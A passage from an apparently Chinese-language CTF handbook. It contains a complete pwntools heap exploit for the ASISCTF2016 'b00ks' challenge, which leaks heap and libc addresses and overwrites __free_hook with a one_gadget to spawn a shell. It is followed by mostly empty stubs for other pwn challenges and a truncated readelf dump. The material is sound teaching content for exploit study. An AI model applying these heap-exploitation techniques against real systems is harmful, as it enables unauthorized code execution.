6.1.28 pwn ASISCTF2016 b00ks
$ python exp.py
[+] Starting local process './b00ks': pid 4879
[*] book2 address: 0x562341a04160
[*] libc address: 0x7f87e9425000
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
io = process(['./b00ks'], env={'LD_PRELOAD':'./libc-2.23.so'})
libc = ELF('libc-2.23.so')
def Create(nsize, name, dsize, desc):
io.sendlineafter("> ", '1')
io.sendlineafter("name size: ", str(nsize))
io.sendlineafter("name (Max 32 chars): ", name)
io.sendlineafter("description size: ", str(dsize))
io.sendlineafter("description: ", desc)
def Delete(idx):
io.sendlineafter("> ", '2')
io.sendlineafter("delete: ", str(idx))
def Edit(idx, desc):
io.sendlineafter("> ", '3')
io.sendlineafter("edit: ", str(idx))
io.sendlineafter("description: ", desc)
def Print():
1408
6.1.28 pwn ASISCTF2016 b00ks
io.sendlineafter("> ", '4')
def Change(name):
io.sendlineafter("> ", '5')
io.sendlineafter("name: ", name)
def leak_heap():
global book2_addr
io.sendlineafter("name: ", "A" * 0x20)
Create(0xd0, "AAAA", 0x20, "AAAA") # book1
Create(0x21000, "AAAA", 0x21000, "AAAA") # book2
Print()
io.recvuntil("A"*0x20)
book1_addr = u64(io.recvn(6).ljust(8, "\x00"))
book2_addr = book1_addr + 0x30
log.info("book2 address: 0x%x" % book2_addr)
def leak_libc():
global libc_base
fake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)
Edit(1, fake_book)
Change("A" * 0x20)
Print()
io.recvuntil("Name: ")
leak_addr = u64(io.recvn(6).ljust(8, "\x00"))
libc_base = leak_addr - 0x5ca010 # mmap_addr - libc_b
ase
log.info("libc address: 0x%x" % libc_base)
def overwrite():
free_hook = libc.symbols['__free_hook'] + libc_base
one_gadget = libc_base + 0x4526a
fake_book = p64(free_hook) * 2
1409
6.1.28 pwn ASISCTF2016 b00ks
Edit(1, fake_book)
fake_book = p64(one_gadget)
Edit(2, fake_book)
def pwn():
Delete(2)
io.interactive()
if __name__ == "__main__":
leak_heap()
leak_libc()
overwrite()
pwn()
参考资料
https://ctftime.org/task/2492
1410
6.1.29 pwn Insomni'hack_teaserCTF2017 The_Great_Escape_part-3
6.1.29 pwn Insomni'hack_teaserCTF2017
The_Great_Escape_part-3
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
1411
6.1.29 pwn Insomni'hack_teaserCTF2017 The_Great_Escape_part-3
$ file the_great_escape_part3
the_great_escape_part3: ELF 64-bit LSB executable, x86-64, versi
on 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86
-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=08df0c3369b497ee8e
d8fca10dbb39ae75ebb273, not stripped
$ checksec -f the_great_escape_part3
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
RPATH No RUNPATH Yes 0 6 the_grea
t_escape_part3
$ ldd the_great_escape_part3
linux-vdso.so.1 (0x00007ffe0f1e8000)
libjemalloc.so.2 => /usr/lib/libjemalloc.so.2 (0x00007fa
5e82dd000)
libc.so.6 => /usr/lib/libc.so.6 (0x00007fa5e7f21000)
libstdc++.so.6 => /usr/lib/libstdc++.so.6 (0x00007fa5e7b
98000)
libpthread.so.0 => /usr/lib/libpthread.so.0 (0x00007fa5e
797a000)
libdl.so.2 => /usr/lib/libdl.so.2 (0x00007fa5e7776000)
libgcc_s.so.1 => /usr/lib/libgcc_s.so.1 (0x00007fa5e755e
000)
/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-6
4.so.2 (0x00007fa5e875c000)
libm.so.6 => /usr/lib/libm.so.6 (0x00007fa5e71c9000)
64 位动态链接程序，但其使用 jemalloc 替代了 glibc 里的 ptmalloc2，很有意思。
关于 jemalloc 的更多内容可以参考章节 1.5.11。
题目解析
漏洞利用
参考资料
1412
6.1.29 pwn Insomni'hack_teaserCTF2017 The_Great_Escape_part-3
https://ctftime.org/task/3311
1413
6.1.30 pwn HITCONCTF2017 Ghost_in_the_heap
6.1.30 pwn HITCONCTF2017
Ghost_in_the_heap
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file ghost_in_the_heap
ghost_in_the_heap: ELF 64-bit LSB pie executable x86-64, version
1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-6
4.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e862c2118fbad287f594
7b95b6f5a5a532fa4a6f, stripped
$ checksec -f ghost_in_the_heap
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Full RELRO Canary found NX enabled PIE enabled
No RPATH No RUNPATH Yes 1 2 ghost_in
_the_heap
$ strings libc-2.24.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.24-9ubuntu2.2) stable release vers
ion 2.24, by Roland McGrath et al.
Compiled by GNU CC version 6.3.0 20170406.
64 位程序，保护全开。
题目解析
漏洞利用
1414
6.1.30 pwn HITCONCTF2017 Ghost_in_the_heap
参考资料
https://ctftime.org/task/4847
1415
6.1.31 pwn HITBCTF2018 mutepig
6.1.31 pwn HITBCTF2018 mutepig
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file mutepig
mutepig: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dy
namically linked, interpreter /lib64/ld-linux-x86-64.so.2, for G
NU/Linux 2.6.32, BuildID[sha1]=180b126011ab0d74ab49d0c3c52a41e85
155a6a9, stripped
[firmy@firmy-pc mutepip]$ checksec -f mutepig
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 1 mutepig
$ strings libc-2.23.so | grep "GNU C"
GNU C Library (GNU libc) stable release version 2.23, by Roland
McGrath et al.
Compiled by GNU CC version 8.1.0.
64 位程序，开启了 Canary 和 NX。
题目解析
漏洞利用
参考资料
1416
6.1.31 pwn HITBCTF2018 mutepig
https://www.xctf.org.cn/library/details/hitb-quals-2018/#mutepig-pwn
1417
6.1.32 pwn SECCONCTF2017 vm_no_fun
6.1.32 pwn SECCONCTF2017 vm_no_fun
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file inception
inception: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV
), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 2.6.32, BuildID[sha1]=c36d0c2ef8cae7c5166fa8e3cc30
a229f97968c3, stripped
$ checksec -f inception
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled PIE enabled
No RPATH No RUNPATH Yes 0 3 inceptio
n
$ strings libc-2.23.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu9) stable release versio
n 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.4.0 20160609.
64 位程序，开启了 canary、NX 和 PIE，默认开启 ASLR。
题目解析
漏洞利用
参考资料
1418
6.1.32 pwn SECCONCTF2017 vm_no_fun
https://github.com/SECCON/SECCON2017_online_CTF/tree/master/pwn/500
_vm_no_fun
1419
6.1.33 pwn 34C3CTF2017 LFA
6.1.33 pwn 34C3CTF2017 LFA
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
题目解析
漏洞利用
参考资料
https://ctftime.org/task/5167
https://github.com/bkth/34c3ctf/tree/master/LFA
1420
6.2.34 pwn N1CTF2018 memsafety
6.2.34 pwn N1CTF2018 memsafety
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
题目解析
漏洞利用
参考资料
https://ctftime.org/task/5494
https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/pwn/memsafety
1421
6.2.1 re XHPCTF2017 dont_panic
6.2.1 re XHPCTF2017 dont_panic
题目解析
参考资料
下载文件
题目解析
第一步当然是 file 啦：
$ file dont_panic
dont_panic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
statically linked, stripped
64 位，静态编译，而且 stripped。
看一下段吧：
$ readelf -S dont_panic
There are 13 section headers, starting at offset 0xfa388:
Section Headers:
[Nr] Name Type Address Offs
et
Size EntSize Flags Link Info Ali
gn
[ 0] NULL 0000000000000000 0000
0000
0000000000000000 0000000000000000 0 0
0
[ 1] .text PROGBITS 0000000000401000 0000
1000
000000000007ae40 0000000000000000 AX 0 0
16
[ 2] .rodata PROGBITS 000000000047c000 0007
c000
1422
6.2.1 re XHPCTF2017 dont_panic
0000000000033f5b 0000000000000000 A 0 0
32
[ 3] .typelink PROGBITS 00000000004b0080 000b
0080
0000000000000b4c 0000000000000000 A 0 0
32
[ 4] .itablink PROGBITS 00000000004b0bd0 000b
0bd0
0000000000000038 0000000000000000 A 0 0
8
[ 5] .gosymtab PROGBITS 00000000004b0c08 000b